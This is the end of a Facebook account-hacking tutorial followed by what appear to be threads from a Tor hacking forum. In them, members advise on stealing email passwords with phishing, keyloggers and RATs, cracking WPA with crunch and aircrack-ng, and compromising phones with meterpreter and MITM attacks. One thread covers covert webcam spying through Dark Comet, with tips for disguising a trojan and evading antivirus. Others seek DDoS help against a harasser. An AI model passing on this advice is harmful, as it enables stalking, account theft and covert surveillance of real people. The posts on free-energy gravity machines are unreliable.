difficult than the rest, but it is also the most common method to hack someone's account. The most popular type of phishing involves creating a fake login page. The page can be sent via email to your victim and will look exactly like the Facebook login page. If the victim logs in, the information will be sent to you instead of to Facebook. This process is difficult because you will need to create a web hosting account and a fake login page.The easiest way to do this would be to follow our guide on how to clone a website to make an exact copy of the facebook login page. Then you'll just need to tweak the submit form to copy / store / email the login details a victim enters. If you need help with the exact steps, there are detailed instructions available by Alex Long here on Null Byte. Users are very careful now with logging into Facebook through other links, though, and email phishing filters are getting better every day, so that only adds to this already difficult process. But, it's still possible, especially if you clone the entire Facebook website.How to Protect YourselfDon't click on links through email. If an email tells you to login to Facebook through a link, be wary. First check the URL (Here's a great guide on what to look out for). If you're still doubtful, go directly to the main website and login the way you usually do.Phishing isn't only done through email. It can be any link on any website / chat room / text message / etc. Even ads that pop up can be malicious. Don't click on any sketchy looking links that ask for your information.Use anti-virus & web security software, like Norton or McAfee.Method 4: Stealing CookiesCookies allow a website to store information on a user's hard drive and later retrieve it. These cookies contain important information used to track a session that a hacker can sniff out and steal if they are on the same Wi-Fi network as the victim. They don't actually get the login passwords, but they can still access the victim's account by cloning the cookies, tricking Facebook into thinking the hacker's browser is already authenticated.Image via wikimedia.orgFiresheep is a Firefox add-on that sniffs web traffic on an open Wi-Fi connection. It collects the cookies and stores them in a tab on the side of the browser.From there, the hacker can click on the saved cookies and access the victim's account, as long as the victim is still logged in. Once the victim logs out, it is impossible for the hacker to access the account.How to Protect YourselfOn Facebook, go to your Account Settings and check under Security. Make sure Secure Browsing is enabled. Firesheep can't sniff out cookies over encrypted connections like HTTPS, so try to steer away from HTTP.Full time SSL. Use Firefox add-ons such as HTTPS-Everywhere or Force-TLS.Log off a website when you're done. Firesheep can't stay logged in to your account if you log off.Use only trustworthy Wi-Fi networks. A hacker can be sitting across from you at Starbucks and looking through your email without you knowing it.Use a VPN. These protect against any sidejacking from the same WiFi network, no matter what website you're on as all your network traffic will be encrypted all the way to your VPN provider.Protecting Yourself: Less Is MoreSocial networking websites are great ways to stay connected with old friends and meet new people. Creating an event, sending a birthday greeting and telling your parents you love them are all a couple of clicks away.Facebook isn't something you need to steer away from, but you do need to be aware of your surroundings and make smart decisions about what you put up on your profile. The less information you give out on Facebook for everyone to see, the more difficult you make it for hackers.If your Facebook account ever gets hacked, check out our guide on getting your hacked Facebook account back for information on restoring your account.
Oh btw. The site has pics and stuff but they aren't really important. The other tutorials are cool though. 
I already knew all the methods described, but this is a really good guide. Nice job!
Aside from passwords, I'd like to mention that you can find a persons profile without logging into facebook via facebook.com/directory/. If it's hidden I would try skipease.comWay to go facebook!
There is one other option, however, it is invite only. I found it the other day. It's called SpearpengI can get invites I think, if anyone is interested.
There is an option that let you choose from his friends and you have to mark who is who, from 4 times tried this just one I could pass because the guy had just a few friends, other the time expired and rest I wasn"t accurate enough.Depends location, user_agent, black listed IP, you'll get easier or harder sec meassures.Banks like Santander controls even the time usually takes to write down your pass. I found that in webs where a copy/paste password wont log in, instead writting was ok.Also typical mss "this account is locked because you never connected before from this device" is actually a pain in the ass.
@1333 - Didn't Facebook have you review several friend match ups to change the password, or to verify that the account was yours? Both perhaps.@thegrayone - Sounds interesting, neat.I wouldn't consider many of these methods "hacking" It's more of a method to gain entry through trial and error, rather then by force or the involvement of foreign programs.
Hey guys, So I know facial recognition is a thing, but I was wondering is it possible to use it for searching pictures over the deep web or the clearnet possible? 
You can upload a pic to Google Images (https://encrypted.google.com/imghp) and search for similar pics not sure if It really acts as Facial Recognition but its worth a try.
I've tried some software,but don't work very well :( ... some of these works on facebook images, but it is very difficult have good results,...it's my experience, maybe there are better software... It's possible create one,but the problem is where take results? need alot of database where search,like police intranet...,the OSINT research on Google or facebook it's not enough, i think.
Software shouldn't be the hard part ��_ I mean even Android and Apple devices have somewhat good facial recognition software built into their photo viewing software and there is surely even better freeware out there just waiting to be downloaded the actual hard part is getting into a serious to be taken database if you should ever get your hands on one let me know I would definitely be interested in such a project.
There is a big difference between recognizing WHERE a face is located in an image than recognizing WHO the face belongs to. This would require recognizing all of the faces unique features, storing them and finally recognizing a face which may have changed over time or be on a blurry image. And that for billions of people. Good luck with finding a search engine which supports that. If you find one, let me know...
Playing around with I2P. What are some addresses to check out? Looking for forums and good torrent sites. Still working it out so I might have questions. 
I am using crunch to generate a word list that is piped to aircrack-ng. It will run for 8-10 hours and not find the password. Is there anyway to speed up the process? I know you can create custom wordlist using the -t option with crunch, but I want to break a WPA/WPA2 passphrase without knowing anything but the BSSID/ESSID (from airodump-ng). Any ideas? 
I've tried aircrack a lot of times on different computers but it never worked for me. If anyone else did it well, please tell or I will continue to think like aircrack is scam
I can get it to work if I know the password. Let's say password is letmein000, then I can do `crunch 10 10 letmin0 | aircrack-ng -b ##:##:##:##:##:## -w -`. It will crack that one, but my problem is.... If I know the password, why crack it? I need to get it to work without knowning anything about the password. 
oclhashcat with big wordlists from crunch, only thing is, you need a good amd gpu, perhaps a 7950 (which is about 70 usd here - best bang for the buck).Alco check this out:https://hashcrack.org/
How well does it work with NVidia? Can't afford a new setup right now. I'm running two NVidia GT750M
I am looking to create the aforementioned. A guide I have seen uses Openvpn. I have read that 3rd party VPN's could store logs. Has anyone tried this? 
I have been wanting to make a website on the onion that allows people to search through college textbooks in a way that is organized by the difficulty of the courses to help students that are taking placement tests as well as individuals who wish to further their education at their own pace that cannot afford an education. But I am not quite familiar how to even sign up for my own .Onion host. Does anyone have an Idea? This is something that I have been wanting to do for quite some time, just a simple link or two to the right direction would suffice.     Thanks Everyone!              ~K7N3X
I have not the slightest idea. However, I would be happy to partake in such a community as a self-learner myself.I assume self-learning and "educated but not from an institution" are synonomous..  In actuality, a lot of my success is owed to the many educated people who pour their expertise into textbooks, websites, and videos and make themselves available for educational discourse.
Agreed. Although It would be difficult to torrent the collection of books that I have acquired over the years..
If you haven't already googled this on the clearnet, on securitygeeks.net there's an article "How to make a .onion website using tor network" with step by step instructions.
Thanks alot, Friend. I will be sure to look into it! 
Im unable to help in this sort of thing but i think it is a great idea man, keep us posted on any progress @K7N3X
Will do.
Alright I figured it out. Now it's time to prepare. I'd say around 6 months I should have my template.
Defiantly keep us posted. As soon as I see a link for it I'm there. I'm big into self learning considering I can't even afford to get my ged.
Still working on the pages. Not much done, but as long as I keep going and don't fall back it will only get done in a matter of time.
It would be perfect if you had opened a new topic about opening a .onion website. I know there are resources on clearnet about this but there is no information on that forum. It would be a guide for TOR users.
I was just wondering is there a way to torrent anonymously and securely, or is there an even more secure way to download that I've just not heard of?
Use a VPN service. There are a ton of them out there, use one that does not keep logs. Torguard claims they don't keep logs and they support torrent downloading. It's really a guessing game with VPN services.IVPN: They allow you to buy VPN services with bitcoin and only provide them with an email address nothing else cost is a little higher, fast speeds, no logs. Link below (ClearNet)https://www.ivpn.net/ Torguard:There VPN service has a really SLA and is trusted by a fair bit of people, they do however request more personal information and do not accept bitcoin, low costing, fast speeds, no logs. Link below (ClearNet)https://torguard.net/--ZackFa!con
ZackFa!con do you now if the hash leak would be prevented by a VPN?
Change your MAC address and crack others wifi :)
Thanks for the info, can't really justify a VPN right now though, so in the future maybe.
Is there any good free vpn ? 
I'm looking for a darknet link to a file uploading site so that I may help a few posters get some books they are looking for.There are currently a few out there, although I would like some opinions on some links that have been used before successfully, Thanks,    K7N3X
Hello all. I was wondering if anyone knows any good ways to hack and log information on Android and IoS devices. Thank You.
Do you have any knowledge in software engineering?
Very small. I know a small ammount of c++ and I know alot of useless batch. What tools would I need to succeed?
So you're looking for a step by step tutorial and some easy to use tools for cross platform hacking?
Hi,if you have manual access to the device,you can gather a lot of information with a forensic analysis,you can extract passwords,text,locations,delete images etc...,you can use the Italian distro named CAINE or DEFT Linux. Moreover,you can attack by remote,infect the device with your code [better],or,use already meterpreters crypting them and send to the target with a SE pretext,or,if you are in the same network,you can sniff data with MITM attack,you can use Ettercap for this.I hope i was helpful.EDIT:More,if you can access to the phone,maybe with a pretext or simply subtracting,you can istall apps like mspy,mobistealth etc...,with these you can tracking,capture sms,keylogging etc.
I would have no manual access to the device. I will look for the MITM attack.Thank You.
MITM would be your best best. @BlackArchSE I've been reading about mobile security but may be wrong here, but isin't Android is somewhat similar to Linux which uses Process Isolation and File Permissions? This allows the OS to limit the code only within it's sandbox, how would one break the sandbox sort of say and take over the entire device monitoring everything that goes on? Once again I've only started to read on mobile security so I may be wrong here, thanks for any information!xxxdonxtaxxx
@xxxdonxtaxxx exactly, but the sandbox is not unbreackable :) , a method is rooting the device or simple use a "root exploit built-in",so you have a deep access.Android ask the permission for install,so you must very persuasive.For hacking test on smartphones, i suggest the use of smartphone-pentesting-framework,you can find it in Bugtraq II Black Widow already installed.@Flt // Using MITM is good way,but warning,if the target it is connect to facebook or others https pages,we need strip the certificate of the ssl,or,we can take only encrypted messages or nothing.So use false certificate or strip the ssl.
@BlackArchSE Hmm.. So Bugtraq 2 Black Widow is another OS I should take a look at. I am currently working with Kali, would you suggest any tools to look at in Kali for mobile security, or just move to the Bugtraq OS altogether for mobile security?
This is not very easy in general(Depending on what you want). To do a MITM attack is easy but getting control of the device is a pain in the ass using a script kiddy method. By default Android does not allow any unknown apps or unsigned apps to be installed.. Unless you know programming you are kinda screwed. I have hacked a few Androids this was and honestly it was not easy, you really need to know what your doing if you cannot get your hands on the device.Even if you manage to get the user to download and try to install something like a backdoor the OS will stop the user from installing it.It can be done by attaching a payload to an app and using a MITM attack to get the user to download the app but you need to attach the payload right or the OS will just block everything..--ZackFa!con
Indeed,before you must "rooting" the device for rewrite it.Usually manually but not necessarily.@xxxdonxtaxxx i don't use kali,i do not remember if there are tools for phone pentesting, sure for forensic analysis.But you can install smartphone-pentesting-framework on kali if you want work on it.However, i don't know what you exactly aiming but if you want simply gather emails and passwords,use phishing method with SE pretext,do not need any advanced notion of programming.
I resolved it, delete this.
What's your favorite Operating System for hacking?I know some people use Windows, some use Mac and a lot like in my case use Linux.I was curious on knowing what is your choice and why?What do you guys think it's the best OS for hacking in 2014?Leave all your replies here so we can discuss.Have fun. - A
It is better to use an older OS, mainly becuase OS' like win7 and such are restricted in how much you can do with them. Older OS' are much less restricted and allow you to have alot more freedom.
My favorites are BackBox, which is what im running on now, and Blackbuntu. If you want the iso files, let me know, as its kind of tricky to find Blackbuntu 12.04
I remember I have been rooting for the fall guy, for the largest part of my life. Bear with me while I apply my poor sense of humor in the next few lines while attempting to give a suitable answer at the same time."Want to be part of an overwhelming software adventure?! We have horrific enemies and dedicated groups sworn to crash us at the very first chance they get! We also sponsor an ever growing community dedicated in writing an ever increasing collection of awesome worms and viruses ready to provide thrilling super infections and mass hysteria giggles, every day, of every week, of every month of every year (yes even New Year's eve and Christmas)!

I use tails with an encrypted persistence folder to save my files.What does this mean?You install tails into a flash drive, you plug it into your PC, and you boot it. If you take out the flash drive there is no residue of you using it. AT ALL! In fact, the flash drive doesn't even save files, no bookmarks, programs, nothing.Wait that last part is a problem...This is where you use something called "persistence,"; it is an encrypted folder on the flash drive that stays there after you disconnect the drive from the computer. This is great for- bookmarks (encrypted tor bookmarks are cool)- Programs (nobody can see your virus unless you tell them the passphrase)- and whatever else (keyrings, pirated things, etc)It is a debian linux.also if you get a virus it is gone by the time you reboot, as long as you didn't put it in your persistence folder.- if you do use the persistence folder I recommend using it for only what you absolutely have to, I only use it for the gcc compiler and my C programs, that is it.
Gentoo if you want to look cool, Arch if you want to look like wannabe hacker, Kali if you actually want to do something.
Kali is a silly cracker OS, Arch is the master race, Gentoo is great.
Although I use Kali, Core Impact looks awesome. But it's $40 000 US... yup. I've been looking for a torrent actually, but the one I found stuck at 86.9%.
I suggest you BlackArch with a lot of tools ready for use.But if you want something with better security and anonymity use Parrot OS,it's have the anonymous Mode already installed and the tools of kali linux.Black Hat Sec also it's a good distro.
I have been experimenting with Kali Linux. Seems like a pretty nice system design. Plus it comes with all the tools you could need out of the box. 
Arch is my one true love.
I spent more time fixing Parrot OS after its last upgrade than I did hacking with it.. I just stick with Kali, Sometimes I also use Tails. I like the idea of Parrot OS but there is next to no support for it and half the time has a ton of issues. Parrot OS works great once you fix what updating it breaks.--ZackFa!con
@Kryptik need torrent for Blackbuntu 12.04. I downloaded a version of Blackbuntu and i couldn't upgrade or update.
@ZackFa!con Parrot 2.0 is cooming soon,try it!
@BlackArchSE Yeah I seen that on there site I am pretty excited, I like the idea of Parrot OS. If they can get the OS to work right it would be so much better than Kali. --ZackFa!con
Hey guys,Recently, I've started taking interest in hacking, but what I've come across most of the time is that I'd need to learn several programming languages (including php, Python, C, C++ and what not). With all the programming languages around, I was wondering where should I start? I'm good with HTML and I did some Pascal back in high school, so I'm familiar with the basic logic around the programming.~TheNewGuy
If you want to hack websites/web applications, learn PHP (maybe ASP as well), SQL and JavaScript.If you want to write exploits or cracks etc, learn C and Assembly.Python, Perl, etc are good for writing useful utilities of all sorts and automating stuff you do regularly.Knowing basic programming logic will help a lot. Make sure you practice a lot. Set up a testing server of your own to run different services and web applications on. You are going to make mistakes at first and you don't want those screw-ups recorded in some logfile you don't have access to. 
Thanks a bunch fnord :)
Im learning python right now  , i think is fundamental for starters . 
I have been attempting to learn coding languages; mainly c++ and HTML. I'm still at a very basic level, but I would like to know what you guys did to learn. Any tips of where to move further in programming would be greatly appreciated!
What is an easy way to retrieve someone's email password? COuld anybody help me? Thanks! 
@anomalistic2If by retrieve you mean intercept...Do you have physical access to the machine? If yes, keyloggers work.  If no physical access, check into Wireshark for all your ftp, smtp, http intercept needs.Search for tutorials like "forensics using wireshark"
If the target is using a popular webmail like Gmail, Yahoo Mail, or Hotmail, your bruteforcing options are limited, as they have good security. I would reccomend using either a phishing page (a fake website that looks a lot like the webmail login that you send to the target to get them to log in) or try to infect the target with a RAT or Keylogger to get their password.
You might wanna think about a MITM (man in the middle attack), its good to steal cookies if someone is on the same wireless connection than you.
MITM with wireshark works.. Keylogger works great if you can get on the device.Or try doing a Forgot my password and see what your options are... Sometimes if you know the person the answers to there questions are pretty easy.
This is very simply but very quick and nothing to loose to try. Actually I Hope this is not gonna be too obvious/naive to post in here.I mean to just google all 'his' knowed usernames in between '' and if results are too high cause is a very common username, using Search Operators will help to filter.If your target likes forums and used to use same user pass comb in weak websites, one of that websites Could Be already hacked and published in sites like *paste*.*This is like 'check your self if you been hacked' but checking others.Even if you just get 'his' pass hashed attached to one of 'his' usernames you can still google for its crack or crack by yourself.Next step is pray for the password used is same as used in the email and hasn't double verification, adaptive security and stuff.Different mades have their own tricks that are changing time to time. I found easier to access emails_acc if the mail server have a dedicated mobile subdomain cause filter less about location, even for user_agent. Others if ask you for the email and is Other than wich you know (in case you signing with the username) just reload the page, and so on..Multisite password is a human vulnerability that happend more times that is thought.I bet mostly all of us repeat some passwords in different sites and years ago was still worse.
If anyone knows Good, explained and detailed Programming books that might help me understand hacking a little bit more, Please post below :3
There are lots of posts about this.. SoldierBoy posted a whole collection of them.. Check the board.
Tell me what programing languages/concepts/topics you are interested in and I will post links in this thread: http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=10848 
If you have anything on Python I will take it.
...or a group of hackers to work with me on a missing person case. Message me for more details.

There is no way for us to PM you.. Do you have a TorChat address or Bitmessage address.. Also if anyone has an opinion on the security of the two I posted please express it.
So i need to  live stream from a webcam in laptop without having any programs running in tray or anything (I mean something stealth). I've recently got better internet connection from the place i want to stream so I'm sure it will handle streaming. What do i need to know / have / look for?Anything answer will help i think.Any ideas?
If your just trying to stay anonymous just do it though tor.
There'a always a feature where you right click the startup bar, go to preferences, icon settings, you can hide the icon so it doesn't show. Most people don't really notice the hidden icon tray.
@W1LLS0N - It will go slow, I need as low latency as possible.@K7N3X - I know that but i prefer no icon at all.I need something similar to RAT but maybe simplier. Any thoughts?
you might have to find the specific part of the script of the program that disables the icon tray from under the applications hood. there are programs out there that disable the icon tray  due to the fact that it needs to be cloaked, so certain users wont view that the program indeed is running. 
So now I need to find a program that allows to use webcam, any ideas?I've heard that many RATs are capable of doing this kind of things but I don't know any.
First things first.. Can you disable the AV? Can you shutdown the systems security? If you can do the above than you can plant a Trojan... There are two ways you can get a Trojan, if your a programmer than you can code one(Best way)..If you are not a coder than you need to script kiddy a trojan or get someone to write the backdoor for you.. If you have complete control over the unit you can kill all the security and use something like Sub7... Sub7 is old but if you make all the right changes it will work. At this point you can view the cam and hear on the mic and do a remote wipe. keep in mind this is not full proof.Honestly coding your own is a better idea all around..Next step what I find the best way is to delete the uses IE icon on there desktop change the icon of the trojan server to the IE icon and plant it on the desktop. If you are coding link the icon to iexplorer.exe as well so IE also boots up.. The use should not be able to notice.. You will likely need to change some firewall ports and do some port forwarding if your using Sub7.. I have not used Sub7 in years but I am sure you can torrent a copy of it...Most of this is just a maybe, as I have said I have not used Sub7 in year but I do remember it being able to do what you are posting.. Your always better off writing your own code.. Controlling a computer is not very hard...If you do use Sub7 and you think the user may have caught you wipe the system asap.. (Sub7 can do remote wipe)There are ways you can do this though tor but that part you are going to need to look up on your own.. It's no fun if I give you all the answers.Sub7 is not a full proof idea I have not used it in a long time, honestly I would test it on one of your own systems and network before risking deploying it. Food for thought--ZackFa!con
The other issue I see, depending on the hardware, is the recording light. Usually if the camera is in use, it's light turns on, this is for both USB and built in cameras. I imagine it is possible to bypass this if you can alter the software somehow, but the newer devices have onboard (built into the device) microcontrollers which control such things. I'm no expert, but you'd have to know more Machine language to hook into any running programs and hijack the camera without being detected.
Thanks for the answers. I didn't expect such big answers.@thegreyoneI've removed the light, no more problem with it.@ZackFa!conI do know some basic programing (C++) but not enough to make a program to control things outside of it. Maybe later.I can disable security but only for installation time. I've managed to get my hands on Dark Comet and it works well, but as said above I can disable anti-virus only for installation time - when i run scan it gets detected and deleted after system reboot. Any way to get it covered in some way (excluding exception list)?It should be enough for me, will try to find a way to exclude it from scan. If I won't find anything i will have to use exception list.Anyway, thanks for Your answers :)
Droid sheep is probably the most known Session Hijacking tool  sadly I can't find a trustworthy source for the APK... witch sucks but this got me thinking ��_ It actually cant be that hard to just set up a modem witch allows me to log all sessions of people using its WiFi ...my main question would be what (trustworthy) program would be suitable for this task ��_. and in witch way mus my modem be configured (for example probably with WPA disabled  ��_) also how do I force my Browser to accept the stolen sessions...
See is zANTI is what your looking for... It is the old dsploit app.. You cannot do a session hijack without connecting to the network some how... It don't matter if your using WPA/WPA2 or WEP if you can get into there network than you can do pretty much anything.. There is more to hacking than one simple app.. You first need to get into the network before you can do anything.. Weather you hack into it or just ask for the Key..The likely hood of you doing all this with a phone is not very high.. Once your into the network than yes you can just use your phone...To break a WPA/WPA2 you first need to dump the handshake than bruteforce it... WEP can be hacked easy, WPS is also pretty easy to crack..A lot of this you are better off using a laptop or if need be a small computer like a Raspberry PI..If you need tips just ask..--ZackFa!con
Getting into the network is not the problem (even though I would be interested in that as well)because I would be the owner of it
I just Looked Zanti up is this the original source ?https://www.zimperium.com/zanti-mobile-penetration-testing And it seems to be just for mobile devices is there some kind of alternative preferably win or linux ? 
Yes that is the original source..If you need to do hijacking with a PC you can use Kali Linux or Parrot OS(There are others too). Zanti is really only for mobile phones.Kali and Parrot come with many tools right out of the box. I am sure you will find what your looking for with them two OS's
Thanks man ��_ just what I was looking for ��_Now back to what you mentioned before... can you roughly explain to me how that works with dumping the handshake and where do I go from there ...
You use airmon-ng to dump..If you look up airmon-ng there will be a ton of HowTo's and even videos..Backtrack and Kali are pretty much the same so Backtrack stuff should also work.
Ok thanks allot man.
So recently i found out that a lot of views on youtube are fake and are generated falsely by others, same thing with accounts on twitter like spam bots and ones made specifically made for boosting ones follower count. Recently i found out this is called using SEO black hat methods, i really want to try this but im not sure where to start as i can infer its probably very secretive considering its potential use. Anyone have any idea how or whats needed to make bots or views in bulk for substantial user traffic? Really appreciated, thanks.
Ok I'm a total nub. I hardly know the basics of programming but I'm learning. Can anyone explain to me first how to get the software then how to execute a DDoS attack?
I know low orbit ion cannon (loic) will "turn your computer into a zombie" whatever that means. That doesn't exactly sound fun. 
I'm not an expert too, what i know is that DDoS = Distributed Denial of service, which means that the attack comes from many sources(or IPs), basically in this type of attack the attackers send packets(which can be UDP, TCP, HTTP or other type of packets) to the victim IP until the victim can't handle all packets requests and then stucks. Usually the attacker spoof the IP of the packets or change his IP for security purposes.There are different types of DDoS techniques(search on wikipedia for syn-flooding, ping of death, DRDOS) There a lot of DDoS on the clearnet(search for Hoic, loic, goodbye...)Hope you understood, i'm not good at explanations.(Don't get offended but you could also find these and a lot of more infos by doing a simple research with Google,you shouldn't post here for every doubt, what i advice is: do a research on the clearnet and then if you don't find anything ask here)
So I've had the application "peerblock" on my computer for a while. My brother downloaded it and said to run it whenever I go online. I'm not really sure what it does at all. But I'm wondering if anybody would be willing to explain to me what it does? 
How about looking on wikipedia before asking? https://en.wikipedia.org/wiki/PeerBlock
Hi IE, I'm going to chapters do get some books about Network Attacks and using URLsnaff and SSLsniff. Do you guys recommend any books to read about various network attacks? Thanks!
Hi to everyone, i'm new to Intel Exchange, i'll simply introduce myself by saying that i'm a java developer (i started learning java 1 year ago), also studied some html, Css and started with C++ a week ago..By the way, i coded a DOS program in java and it sends UDP packetS via Datagramsocket and what i'd need to know is how can i spoof the ip address(Obviously the IP of the attacker/user) of each packet? (Actually what i know is that Java doesn't have APIs in its Library which can manipulate each packet )(Sorry if my English is not good, it's not my native language)Thank you in advance!
You will have to code in C (or C++) and will have to drop platform independency, because the way you spoof packets is different on every operating system and afaik there's no easy interface for java. If you switch to python you could use scapy, otherwise... RTFM and code in C ;)man socket
 i think i'll try with C++ don't mind platform independency...Thank you!
I think this is a pretty noob question, but still, i need to figure this out. I want to make a backup of my home folder to external storage, witch will be readable from any other computer. Well, simply copying all the files to ext hdd would be easy, but I also want it to sync any new content from either device to another. Hope I made myself clear.Does anyone know a good linux software for this purpose? 
Some cyber bully mother thersea wannabe woman is harassing me on my social profiles. I got an ip but i think the domain is off a proxy. If someone has a good bot net or a booter and can fry this one for me I will love you long time:209.85.238.93hostname: rate-limited-proxy-209-85-238-93.google.comand if it is proxied or coming through a VPN and you know how we can go about decrypting this I will be truly in your debt.
I like robots and will be building my first one soon.I want to create a home defense robot eventually, but am stuck with some of the programming tasks. For reference I will be using C++ mostly.Problem One: I want it to recognize people, weapons ect.. now I know that using a video is a bad idea so I am going to have the robot take pictures every 2 seconds. I know that pictures are just arrays of RGB, but how to I get it to recognize weapons and body parts? I am thinking of having a database of images for different scenarios that the robot will check against.. for exam a database of people holding knieves ect.Problem Two: I want it to recognize words and tone of voice.. I don't mean every word I just mean it will know it someone is saying "I'm going to kill you" in an angry voice.Problem Three: I want it to recognize certain sounds, namely glass breaking, a struggle or gunshots. My default answer is to create a database (array?) that it will check though before making its decision.I know this sounds complicated but its not really.. the robot will only have a few classes within the main one. E.G. a isItAThreat method that will be part of the Threat class, that will scan through the databases (arrays). The behavior will be dictated by numbers, for example if the attack is using bad words, talking aggressively and has a knife the number generated will be different to that of someone just talking aggressively. The numbers (codes?) will be trigger specific behavior and put in a public variable that will be shared with the eliminateTheThreat method.Advice?!?
well from what i have researched every single one of your problem consist of up to 10 or more problems and even entities with nearly unlimited budgets(darpa) haven't found solutions for everything you want yet.as for the recognition part i would outfit your friendly forces (family) with wearable rfid identification systems, this might be useful when you have an argument with your wife(computer recognizes anger in the voices) and she comes out of the kitchen with a knife in the hand... of course you already have a fail safe for that in mind but it's not as simple as you think.how do you want to solve the machine vision problems? you need  cameras and sensors for all spectrums for a reliable setup and i would include laser 3d scanners, cheap radar or even better terrahertz vision to the package.just for recognizing people reliably certain conditions need to be fulfilled... even facial recognition tech can't identify you 100% if you wear a hat or sunglasses, a bandage etc. you would almost need a ASI for all your problems with enormous calculating capabilities no quantum stuff but it needs to be very powerful... remember even cops with years of experience misinterpreted things that were hold by suspects or missed them totally. knifes come in a large array of shapes and sizes. maybe a workaround would be to give the bot the capability to threaten an unknown intruder while aiming the barrels and a green laser at the target. i really like your ideas but i would suggest to do much more research first... south korea has the highest developed autonomous weapon systems...and japan is farthest in the broad spectrum of socially interactive robots. russia also just brought out a new generation of combat robots which are pretty coolthe us deployed some bots to iraq...with bad consequences....up till today no one knows if they were hacked or just went skynet.. http://www.theregister.co.uk/2008/04/11/us_war_robot_rebellion_iraq/have a look here and maybe you could get in touch with some of the guys constructing these guns.https://www.youtube.com/results?search_query=autonomous+sentry+gunagain...good luck with your efforts!
I thought of that to open doors when they patrol the house.. but don't like it for people because it can be hacked. I was thinking a paint of somekind. But the robot will not use one method to ID people at a time. It can have voice recognition (well developed already) and maybe even body language. It will have 3 databases that contain pictures of weapons, people in attack positions with and without weapons and one of sounds (words and tone included). From a programming point of view new people with be assigned to the stranger class - a sub class of people.. the person will be regarded as friendly so long as they do not have any behavior that meets those on the databases or goes into the wrong part of the house. If they display a behavior they change to a hostile.The hostile may become a stranger (neural may be better?) again if they stop there behavior E.G. they get out of my wife's bedroom. Although if they were attacking and surrender they will be designated as a subdued hostile - a sub class of hostile. I will use inheritance and public variables (especially Boolean) to great effect!At the simplest level the robot will just be doing (asking) these things..One: Do I have charge level =>10? If not dock at charging station.Two: Look for threats.. Is it a threat? If yes what type of threat is it? Eliminate threat (may issue warning first).. and loop back.Three: Am I stuck? If no continue patrol. If yes move in x direction.Obviously how the robot deals with certain threats will be an issue, but the numbers or code assigned to each threat can be used in a switch case with each code making the robot run different methods from the eliminateThreat class.Neural networks could be used to increase its learning.. so it can learn to recognize more weapons ect.
Basic design:SensorsOne camera, it will take photos every 2 seconds.Six infrared sensors to check distance around - 2 on each side.One pressure sensor on the front (will also act as buffer to protect from damage).Five photo-resistors to detect light levels around robot, one on each side and one on top of the camera. This will allow it to use night vision properly.ShellLight metal with a layer of home made armor (level one NJI).WeaponsOne pair of laser blinders - which are shop bought lasers mounted on arms that have a radial range of motion (think tank turret). The laser blinders will be used to blind attackers by pointing at their eyes.. smart targeting means the robot will recognize eyes from the RGB arrays of the pictures and if that fails will point at a place the eyes should be on a human.Obviously the robot will have tactics programed, E.G. the robot will priorise pointing the laser blinders at someone with a gun over turning its turret (blinding the person gives the robot more time).
lol when i read the second post i had daleks roaming your house in front of my mental eye hahahai played around with jarvis... which did work ok but my microphone setup was less than ideal. Jasper and sirius look interesting too and i am really looking forward to links kicking off...maybe you could combine some of their functions and trigger them with data from your databases instead of voice activated commands.i am not a programming wizard so i still think that combining the databases effectively is a major problem.did you check out the targeting software for the sentry guns in the link i posted previously? very interesting basic concepts to build up on. one of my projects i am working  on covers iff capabilities and enhanced situational awareness for military units in dismounted combat operations.part of the system  uses augmented reality ,multi spectral cameras,passive ir qr code tags and passive rfid. if no one knows the frequency to actually get into your nfc its almost impossible to hack, also there is nothing to really hack in there...well spoofing the id tag would be a theoretical possibility but there are counter measures integrated into the complete system.as for the weapons you should look into electrolasers...because even a blinded opponent could still fire his weapon in blind rage or slash the air up aiming for sound sources. depending on the juice you put in and the actual threat it could be a less lethal option
The website hosting the software is down.. but the videos were helpful in helping me with the targeting system. To make an advanced one I would have several cameras and software that projects a single image, based on the camera input. It will then check the databases, ideally the program will be able to recognize different body parts. That way the robot could tell where to hit to disable (obviously different weapons would be selected based on threat type). An a speed finding program for the target. On top of that add pictures of body armor to the database and if the threat is wearing it the robot will target another part of the body.With your augmented reality I am assuming that they have virtual reality headsets with cameras that allow them to zoom in and is linked to a camera on their weapons. You are probably competing with the landwarrior system. To make yours stand out I would integrate that microphone thing that detects snipers, maybe make a mini one. Also you could use a shielding cloak that masks infrared - this is quiet cheap and will make them invisible to thermal imaging.
sounds good !have a look for 3d laser scanners for crime scene forensics, mit's radar pages, and wifi to see through walls (terrahertz vision is the advance applictaion)... that should help you with the multiangle combined tracking!there have been several crowd funded programs that were more successful than the dod's standard big 4 in regards to cost effectiveness and innovation.i put an idea up on here for a dw crowd funding system...but it did not gain traction because people were to ignorant...but it's still not dead yet.with my current budgets restrictions which i hope to solve quickly,i am still at the ar glasses stage, but i have got superior alternatives in store.there are multisensor inputs integrated, independent from the wearer of the equipment, including different types of cameras. the problem with the development in general is that the people in charge,always ask the wrong group of people for input.that's why they come up with stupid shit like ar contact lenses... they might be cool if you secretly want to watch porn in your dc office, but under  operational conditions in a crappy country outside the wire...total crap.if you are referring to the chicago array, i got that covered already with a different approach...and the last part you mentioned is also on the list...check out multiphysics cloaking with meta materials...this will make the users invisible to almost anything...on the other hand there is one thing i always keep in mind even with all the tech development..the kiss principle i remember a funny advertisement on a newspaper... i think it was the financial times...the advertisement started how nasa financed the fisher space pen development with 1 million $ to have a pen that could write in the harsh conditions of space.below that was a picture of a pencil and next to it was written...this was the russian answer.
Most of what you say is true with regards to dumb management.. Have a look at snakebite tactical, that's what I was thinking for the robots.Have you considered using Scalar or alternative energy sources for any of you designs? http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=10808I am making a new free energy machine that harnesses the power of gravity.
the snakebite tactical suit is pretty interesting,funny thing you mentioned free energy because i commented on one of your posts regarding such technologies.i researched free energy or zero point energy  a lot as these technologies hold the keys to new dimensions for humankind's development...well at least for the parts of mankind that actually wants to break free from the status quo.eric dollard has a project which might hold the key to the perfect communication system based on longitudal waves.as for the ultimate power solution i haven't found a safe way yet to integrate the technologies i need.radiant energy chargers can't charge the power sources i want to use or better said, there are not even instruments to measure the powers we tap into.so so far i only have a prototype for powering a cheap styrofoam based drone... not much money lost when it gets fried.and i hope to be able to get some data while testing. as soon as my some of my civilian commercial products hit the markets i will be able to solve all of my current other problems.im interested in your approach, i know of one guy from the uk who builds systems based on gravity
